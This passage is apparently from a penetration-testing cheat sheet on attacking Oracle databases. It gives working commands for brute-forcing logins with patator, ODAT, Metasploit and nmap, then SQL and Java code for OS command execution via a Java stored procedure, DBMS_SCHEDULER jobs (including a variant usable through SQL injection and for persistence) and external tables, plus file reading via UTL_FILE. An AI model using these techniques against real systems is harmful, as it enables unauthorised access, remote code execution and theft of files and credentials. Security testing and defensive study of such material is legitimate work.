</pre></table></code></div></div><p>I have mixed all of them and removed duplicates:</p><p><a href="https://secybr.com/assets/file/users-oracle.txt">users-oracle.txt</a></p><p><a href="https://secybr.com/assets/file/pass-oracle.txt">pass-oracle.txt</a></p><h3 id="brute-force"><span class="mr-2">Brute Force</span><a href="#brute-force" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now, that you know a valid SID and valid credentials. To connect to the database you need the tool: <em>sqlplus</em></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>patator oracle_login <span class="nv">sid</span><span class="o">=</span>&lt;SID&gt; <span class="nv">host</span><span class="o">=</span>&lt;IP&gt; <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">password</span><span class="o">=</span>FILE1 <span class="nv">0</span><span class="o">=</span>users-oracle.txt <span class="nv">1</span><span class="o">=</span>pass-oracle.txt <span class="nt">-x</span> ignore:code<span class="o">=</span>ORA-01017

./odat.py passwordguesser <span class="nt">-s</span> <span class="nv">$SERVER</span> <span class="nt">-d</span> <span class="nv">$SID</span>
./odat.py passwordguesser <span class="nt">-s</span> <span class="nv">$MYSERVER</span> <span class="nt">-p</span> <span class="nv">$PORT</span> <span class="nt">--accounts-file</span> accounts_multiple.txt

<span class="c">#msf1</span>
msf&gt; use admin/oracle/oracle_login
msf&gt; <span class="nb">set </span>RHOSTS &lt;IP&gt;
msf&gt; <span class="nb">set </span>RPORT 1521
msf&gt; <span class="nb">set </span>SID &lt;SID&gt;

<span class="c">#msf2, this option uses nmap and it fails sometimes for some reason</span>
msf&gt; use scanner/oracle/oracle_login
msf&gt; <span class="nb">set </span>RHOSTS &lt;IP&gt;
msf&gt; <span class="nb">set </span>RPORTS 1521
msf&gt; <span class="nb">set </span>SID &lt;SID&gt;

<span class="c">#nmap fails sometimes for some reson executing this script</span>
nmap <span class="nt">--script</span> oracle-brute <span class="nt">-p</span> 1521 <span class="nt">--script-args</span> oracle-brute.sid<span class="o">=</span>&lt;SID&gt; &lt;IP&gt;
</pre></table></code></div></div><p>In order to use <code class="language-plaintext highlighter-rouge">oracle_login</code> with <code class="language-plaintext highlighter-rouge">patator</code> you need to install:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>pip3 <span class="nb">install </span>cx_Oracle <span class="nt">--upgrade</span>
</pre></table></code></div></div><p>Offline OracleSQL hash bruteforce (versions <code class="language-plaintext highlighter-rouge">11.1.0.6</code>, <code class="language-plaintext highlighter-rouge">11.1.0.7</code>, <code class="language-plaintext highlighter-rouge">11.2.0.1</code>, <code class="language-plaintext highlighter-rouge">11.2.0.2</code>, and <code class="language-plaintext highlighter-rouge">11.2.0.3</code>)</p><p>To login using known credentials:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;/&lt;SID&gt;<span class="p">;</span>
</pre></table></code></div></div><p>If the TNS Listener is on a non-default port (e.g. TCP/1522) :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;:&lt;port&gt;/&lt;SID&gt;<span class="p">;</span>
</pre></table></code></div></div><p>If an account has system database priviledges (sysdba) or system operator (sysop) you may wish to try the following:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;/&lt;SID&gt; <span class="s1">'as sysdba'</span><span class="p">;</span>
<span class="c">#Example:</span>
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL <span class="s1">'as sysdba'</span>
</pre></table></code></div></div><h2 id="all-in-one"><span class="mr-2">All in One</span><a href="#all-in-one" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>An interesting tool is <code class="language-plaintext highlighter-rouge">oscanner</code>, which will try to get some valid <code class="language-plaintext highlighter-rouge">SID</code> and then it will <code class="language-plaintext highlighter-rouge">brute-force</code> for valid credentials and try to extract some information:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c">#apt install oscanner</span>
oscanner <span class="nt">-s</span> &lt;IP&gt; <span class="nt">-P</span> &lt;PORT&gt;
</pre></table></code></div></div><p>Another tool that will do all of this it <strong><a href="https://github.com/quentinhardy/odat">odat</a></strong>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>git clone https://github.com/quentinhardy/odat.git
<span class="nb">cd </span>odat
./odat.py <span class="nt">--help</span> <span class="c">#It shouldn't be problems in Kali</span>
./odat.py all <span class="nt">-s</span> &lt;IP&gt; <span class="nt">-p</span> &lt;PORT&gt;
./odat.py all <span class="nt">-s</span> &lt;IP&gt; <span class="nt">-p</span> &lt;PORT&gt; <span class="nt">-d</span> &lt;SID&gt; <span class="c">#To bruteforce accounts for that SID</span>
</pre></table></code></div></div><p>With these options (<code class="language-plaintext highlighter-rouge">-s</code> and <code class="language-plaintext highlighter-rouge">-p</code>), ODAT will search valid <code class="language-plaintext highlighter-rouge">SID</code> (System ID) in a first step. You can configure some options for configuring methods (i.e. word-list or brute-force attack). By default, ODAT will use a big word list and it will do a small <code class="language-plaintext highlighter-rouge">brute-force</code> attack.</p><p>If ODAT founds at least one <code class="language-plaintext highlighter-rouge">SID</code> (e.g. ORCL), it will search valid Oracle accounts. It will do that on each <code class="language-plaintext highlighter-rouge">SID</code> found. You can specify some options for credentials (e.g. <code class="language-plaintext highlighter-rouge">--accounts-file</code>, <code class="language-plaintext highlighter-rouge">--accounts-files</code>, <code class="language-plaintext highlighter-rouge">--login-as-pwd</code>).</p><p>For each valid account (e.g. SYS) on each valid instance (<code class="language-plaintext highlighter-rouge">SID</code>), ODAT will return what each Oracle user can do (e.g. reverse shell, read files, become <code class="language-plaintext highlighter-rouge">DBA</code>).</p><p><a href="https://github.com/quentinhardy/odat/wiki">Wiki odat</a></p><h2 id="remote-code-execution"><span class="mr-2">Remote Code Execution</span><a href="#remote-code-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There are at least two different ways to execute commands, such as by using Java procedures and DBMS_SCHEDULER package. By the way, you can also achieve RCE in case of SQL injection in a web application provided, of course, that the user running it has sufficient rights. At this stage, I highly recommend preparing the Oracle Database Attacking Tool: <a href="https://github.com/quentinhardy/odat">ODAT</a>.</p><h3 id="install-odat"><span class="mr-2">Install ODAT</span><a href="#install-odat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>git clone https://github.com/quentinhardy/odat.git
<span class="nb">cd </span>odat
./odat.py <span class="c">#It shouldn't be problems in Kali</span>
</pre></table></code></div></div><h3 id="execute-code-via-java-stored-procedure"><span class="mr-2">Execute Code via Java Stored Procedure</span><a href="#execute-code-via-java-stored-procedure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./odat.py java <span class="nt">-s</span> &lt;IP&gt; <span class="nt">-U</span> &lt;username&gt; <span class="nt">-P</span> &lt;password&gt; <span class="nt">-d</span> &lt;SID&gt; <span class="nt">--exec</span> COMMAND
</pre></table></code></div></div><h3 id="rce-java-store-procedure"><span class="mr-2">RCE: Java Store Procedure</span><a href="#rce-java-store-procedure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>So, imagine that you have the administrator account information. In this case, a very popular way to execute your command on the server is to write a ‘java stored’ procedure. This is done in three stages. First, create a Java class called ‘oraexec’. To do this, connect via ‘sqlplus’ terminal and write:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="k">create</span> <span class="k">or</span> <span class="k">replace</span> <span class="k">and</span> <span class="n">resolve</span> <span class="n">java</span> <span class="k">source</span> <span class="n">named</span> <span class="nv">"oraexec"</span> <span class="k">as</span>
<span class="n">import</span> <span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="o">*</span><span class="p">;</span>
<span class="n">import</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="o">*</span><span class="p">;</span>
  <span class="k">public</span> <span class="k">class</span> <span class="n">oraexec</span>
  <span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">void</span> <span class="n">execCommand</span><span class="p">(</span><span class="n">String</span> <span class="n">command</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span>
    <span class="p">{</span>
      <span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="o">/</span>
</pre></table></code></div></div><p>Next, write a PL/SQL wrapper for this class:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">create</span> <span class="k">or</span> <span class="k">replace</span> <span class="k">procedure</span> <span class="n">javacmd</span><span class="p">(</span><span class="n">p_command</span> <span class="n">varchar2</span><span class="p">)</span> <span class="k">as</span> <span class="k">language</span> <span class="n">java</span> <span class="n">name</span> <span class="s1">'oraexec.execCommand(java.lang.String)'</span><span class="p">;</span> <span class="o">/</span>
</pre></table></code></div></div><p>That’s it. Now, to execute a command, all you need is just to send the following query:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">exec</span> <span class="n">javacmd</span><span class="p">(</span><span class="s1">'command'</span><span class="p">);</span>
</pre></table></code></div></div><p>Note that when using the above procedure, we cannot see the results of executed command, however, you can redirect the output to a file and read it. You can find the full code of the shell that allows to read and write files:</p><p><a href="https://secybr.com/assets/file/raptor_oraexec.sql">raptor_oraexec.sql</a></p><p>However, there is a <a href="https://goo.gl/EuwPRU">more sophisticated script</a> that handles the command output, but it has a larger size <a href="https://oracle-base.com/articles/8i/shell-commands-from-plsql">here</a>.</p><h3 id="rce-scheduler"><span class="mr-2">RCE: Scheduler</span><a href="#rce-scheduler" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The next method, which will help us if there is no Java virtual machine, is to use ‘dbmsscheduler’, the built-in task scheduler of Oracle. To use it, you must have the privilege <code class="language-plaintext highlighter-rouge">CREATE EXTERNAL JOB</code>. Here’s a code sample that implements the entry of ‘0wned’ string into a text file in the root of the C: drive:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">exec</span> <span class="n">DBMS_SCHEDULER</span><span class="p">.</span><span class="n">create_program</span><span class="p">(</span><span class="s1">'RDS2008'</span><span class="p">,</span><span class="s1">'EXECUTABLE'</span><span class="p">,</span><span class="s1">'c:</span><span class="se">\ </span><span class="s1">WINDOWS</span><span class="se">\s</span><span class="s1">ystem32</span><span class="se">\c</span><span class="s1">md.exe /c echo 0wned &amp;gt;&amp;gt; c:</span><span class="se">\r</span><span class="s1">ds3.txt'</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">TRUE</span><span class="p">);</span>
<span class="k">exec</span> <span class="n">DBMS_SCHEDULER</span><span class="p">.</span><span class="n">create_job</span><span class="p">(</span><span class="n">job_name</span> <span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="s1">'RDS2008JOB'</span><span class="p">,</span><span class="n">program_name</span> <span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="s1">'RDS2008'</span><span class="p">,</span><span class="n">start_date</span> <span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="k">NULL</span><span class="p">,</span><span class="n">repeat_interval</span> <span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="k">NULL</span><span class="p">,</span><span class="n">end_date</span> <span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="k">NULL</span><span class="p">,</span><span class="n">enabled</span> <span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="k">TRUE</span><span class="p">,</span><span class="n">auto_drop</span> <span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="k">TRUE</span><span class="p">);</span>
</pre></table></code></div></div><p>This will create and run a job for executing your command. And here’s an option for calling the Scheduler from another procedure – <code class="language-plaintext highlighter-rouge">SYS.KUPP$PROC.CREATE_MASTER_PROCESS</code>, which is of interest to us, primarily, because it allows you to embed multi-statement queries, that is, those consisting of multiple sub-queries. Theoretically, you can run such query even in case of injection into a web application.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">select</span> <span class="n">SYS</span><span class="p">.</span><span class="n">KUPP</span><span class="err">$</span><span class="n">PROC</span><span class="p">.</span><span class="n">CREATE_MASTER_PROCESS</span><span class="p">(</span><span class="s1">'DBMS_SCHEDULER.create_program(</span><span class="se">''</span><span class="s1">xxx</span><span class="se">''</span><span class="s1">,</span><span class="se">''</span><span class="s1">EXECUTABLE</span><span class="se">''</span><span class="s1">,</span><span class="se">''</span><span class="s1">cmd.exe /c echo qqq&amp;gt;&amp;gt;C:/scchh</span><span class="se">''</span><span class="s1">,0,TRUE); DBMS_SCHEDULER.create_job(job_name=&amp;gt;</span><span class="se">''</span><span class="s1">jobx</span><span class="se">''</span><span class="s1">,program_name=&amp;gt;</span><span class="se">''</span><span class="s1">xxx</span><span class="se">''</span><span class="s1">,start_date=&amp;gt;NULL,repeat_interval=&amp;gt;NULL,end_date=&amp;gt;NULL,enabled=&amp;gt;TRUE,auto_drop=&amp;gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&amp;gt;</span><span class="se">''</span><span class="s1">xxx</span><span class="se">''</span><span class="s1">);dbms_scheduler.purge_log;'</span><span class="p">)</span> <span class="k">from</span> <span class="n">dual</span>
</pre></table></code></div></div><p>Note that, when you use the Scheduler, you can run this job more than once and do it with some frequency. As a result, this will help you get a foothold in the tested system, because, even if the administrator deletes the user from OS, this job, which is regularly running in the system, will bring him or her back to life.</p><h3 id="rce-external-tables"><span class="mr-2">RCE: External Tables</span><a href="#rce-external-tables" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>As the last method for achieving the execution of OS commands, I would like to mention the use of External Tables. This method will help you later download files from the server. You will need the following privileges:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>UTL_FILE<span class="p">;</span>
CREATE TABLE<span class="p">;</span>
a directory reserved <span class="k">for </span>the user.
</pre></table></code></div></div><p>Let’s remember that the access to <code class="language-plaintext highlighter-rouge">UTL_FILE</code> package is by default provided to all accounts with <code class="language-plaintext highlighter-rouge">CONNECT</code> role.</p><p>Step one: Check the issued directories with the following query:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="n">ALL_TAB_PRIVS</span> <span class="k">WHERE</span> <span class="k">TABLE_NAME</span> <span class="k">IN</span>
<span class="p">(</span><span class="k">SELECT</span> <span class="n">OBJECT_NAME</span> <span class="k">FROM</span> <span class="n">ALL_OBJECTS</span> <span class="k">WHERE</span> <span class="n">OBJECT_TYPE</span><span class="o">=</span><span class="s1">'DIRECTORY'</span><span class="p">)</span>
<span class="k">and</span> <span class="n">privilege</span><span class="o">=</span><span class="s1">'EXECUTE'</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">GRANTEE</span><span class="p">;</span>
 
<span class="k">TABLE_NAME</span>
<span class="c1">------------------------------</span>
<span class="n">ALICE_DIR</span>
</pre></table></code></div></div><p>Step two: Create an executable batch file with desired command:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">declare</span>
 <span class="n">f</span> <span class="n">utl_file</span><span class="p">.</span><span class="n">file_type</span><span class="p">;</span>
 <span class="n">s</span> <span class="n">varchar2</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span> <span class="p">:</span><span class="o">=</span> <span class="s1">'echo KOKOKO &amp;gt;&amp;gt; C:/pwned'</span><span class="p">;</span>
<span class="k">begin</span>
 <span class="n">f</span> <span class="p">:</span><span class="o">=</span> <span class="n">utl_file</span><span class="p">.</span><span class="n">fopen</span><span class="p">(</span><span class="s1">'ALICE_DIR'</span><span class="p">,</span><span class="s1">'test.bat'</span><span class="p">,</span><span class="s1">'W'</span><span class="p">);</span>
 <span class="n">utl_file</span><span class="p">.</span><span class="n">put_line</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">s</span><span class="p">);</span>
 <span class="n">utl_file</span><span class="p">.</span><span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
<span class="k">end</span><span class="p">;</span>
<span class="o">/</span>
</pre></table></code></div></div><p>Step three: Prepare the external table <code class="language-plaintext highlighter-rouge">EXTT</code>, you will need it to run the file:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">EXTT</span> <span class="p">(</span><span class="n">line</span> <span class="n">varchar2</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
<span class="n">ORGANIZATION</span> <span class="k">EXTERNAL</span>
<span class="p">(</span><span class="k">TYPE</span> <span class="n">oracle_loader</span>
  <span class="k">DEFAULT</span> <span class="n">DIRECTORY</span> <span class="n">ALICE_DIR</span>
  <span class="k">ACCESS</span> <span class="k">PARAMETERS</span>
  <span class="p">(</span> <span class="n">RECORDS</span> <span class="n">DELIMITED</span> <span class="k">BY</span> <span class="n">NEWLINE</span>
    <span class="n">FIELDS</span> <span class="n">TERMINATED</span> <span class="k">BY</span> <span class="s1">','</span><span class="p">)</span>
  <span class="k">LOCATION</span> <span class="p">(</span><span class="n">alice_dir</span><span class="p">:</span><span class="s1">'test.bat'</span><span class="p">))</span>
<span class="o">/</span>
</pre></table></code></div></div><p>Now, just call your batch file with the following command:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">EXTT</span><span class="p">;</span>
</pre></table></code></div></div><p>The terminal will start to display error messages that the system cannot match the table and invoked file but, in this case, it is not important, as the main objective was to open the executable file, which you have achieved.</p><p><code class="language-plaintext highlighter-rouge">ODAT.py</code> utility also can implement this attack. However, it requires the privilege <code class="language-plaintext highlighter-rouge">CREATE ANY DIRECTORY</code>, which, by default, is granted only to <code class="language-plaintext highlighter-rouge">DBA</code> role, since it attempts to execute the file from any and not only “your” directory.</p><h3 id="readwrite-files"><span class="mr-2">Read/Write files</span><a href="#readwrite-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now, let’s proceed to the task of reading and writing the files. If you simply need to read or write a file to the server, you can do it without any Java procedures, which, however, can also handle such tasks. Let’s have a look into <code class="language-plaintext highlighter-rouge">UTL_FILE</code> package that has the functionality required for working with the file system. The good news is that, by default, it can be accessed by all users with <code class="language-plaintext highlighter-rouge">PUBLIC</code> role. The bad news is that, by default, this procedure has no access to the entire file system, but only to a directory pre-defined by the administrator. However, it is not uncommon to find a directory parameter specified as <code class="language-plaintext highlighter-rouge">*</code>, which literally means “access to everything.” You can find this out by using the following command:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">select</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span> <span class="k">from</span> <span class="n">v</span><span class="err">$</span><span class="k">parameter</span> <span class="k">where</span> <span class="n">name</span> <span class="o">=</span> <span class="s1">'utl_file_dir'</span><span class="p">;</span>
<span class="k">With</span> <span class="n">appropriate</span> <span class="n">rights</span><span class="p">,</span> <span class="n">you</span> <span class="n">can</span> <span class="n">expand</span> <span class="n">the</span> <span class="k">access</span> <span class="k">by</span> <span class="k">using</span> <span class="n">the</span> <span class="k">following</span> <span class="n">query</span><span class="p">:</span>
<span class="k">alter</span> <span class="k">system</span> <span class="k">set</span> <span class="n">utl_file_dir</span><span class="o">=</span><span class="s1">'*'</span> <span class="k">scope</span> <span class="o">=</span><span class="n">spfile</span><span class="p">;</span>
</pre></table></code></div></div><p>I found that the shortest procedure for using <code class="language-plaintext highlighter-rouge">UTL_FILE</code> package is proposed by Alexander Polyakov:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="k">SET</span> <span class="n">SERVEROUTPUT</span> <span class="k">ON</span>
<span class="k">declare</span>
<span class="n">f</span> <span class="n">utl_file</span><span class="p">.</span><span class="n">file_type</span><span class="p">;</span>
<span class="n">sBuffer</span> <span class="nb">Varchar</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span>
<span class="k">begin</span>
<span class="n">f</span><span class="p">:</span><span class="o">=</span><span class="n">UTL_FILE</span><span class="p">.</span><span class="n">FOPEN</span> <span class="p">(</span><span class="s1">''</span><span class="k">C</span><span class="p">:</span><span class="o">/</span><span class="err">’</span><span class="p">,</span><span class="s1">'boot.ini'</span><span class="p">,</span><span class="s1">'r'</span><span class="p">);</span>
<span class="n">loop</span>
<span class="n">UTL_FILE</span><span class="p">.</span><span class="n">GET_LINE</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">sBuffer</span><span class="p">);</span>
<span class="n">DBMS_OUTPUT</span><span class="p">.</span><span class="n">PUT_LINE</span><span class="p">(</span><span class="n">sBuffer</span><span class="p">);</span>
<span class="k">end</span> <span class="n">loop</span><span class="p">;</span>
<span class="n">EXCEPTION</span>
<span class="k">when</span> <span class="n">no_data_found</span> <span class="k">then</span>
<span class="n">UTL_FILE</span><span class="p">.</span><span class="n">FCLOSE</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
<span class="k">end</span><span class="p">;</span>
<span class="o">/</span>
</pre></table></code></div></div><p>If you need more functionality with the ability to write, I recommend to google a script called <code class="language-plaintext highlighter-rouge">raptor_oraexec.sql</code>. And according to tradition, here’s an option for using <code class="language-plaintext highlighter-rouge">ODAT</code> utility, which, as always, is the shortest:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./odat.py utlfile <span class="nt">-s</span> &lt;IP&gt; <span class="nt">-d</span> &lt;SID&gt; <span class="nt">-U</span> &lt;username&gt; <span class="nt">-P</span> &lt;password&gt; <span class="nt">--getFile</span> <span class="s2">"C:/test"</span> token.txt token.txt
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">UTL_FILE</code> package is also very interesting because if you’re lucky, you can reach the logs, configuration files and obtain passwords from privileged accounts, such as <code class="language-plaintext highlighter-rouge">SYS</code>.</p><p>The second method that I would like to mention is to use again the <code class="language-plaintext highlighter-rouge">External Tables</code>. Remember that, when using <code class="language-plaintext highlighter-rouge">External Tables</code>, the database can access in read mode the data from external tables. For a hacker, this means yet another opportunity to download files from the server, but this method requires <code class="language-plaintext highlighter-rouge">CREATE ANY DIRECTORY</code> privilege. I suggest immediately using <code class="language-plaintext highlighter-rouge">ODAT</code>, as it is stable and fast:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./odat.py externaltable <span class="nt">-s</span> &lt;IP&gt; <span class="nt">-U</span> &lt;username&gt; <span class="nt">-P</span> &lt;password&gt; <span class="nt">-d</span> &lt;SID&gt; <span class="nt">--getFile</span> <span class="s2">"C:/test"</span> <span class="s2">"my4.txt"</span> <span class="s2">"my"</span>
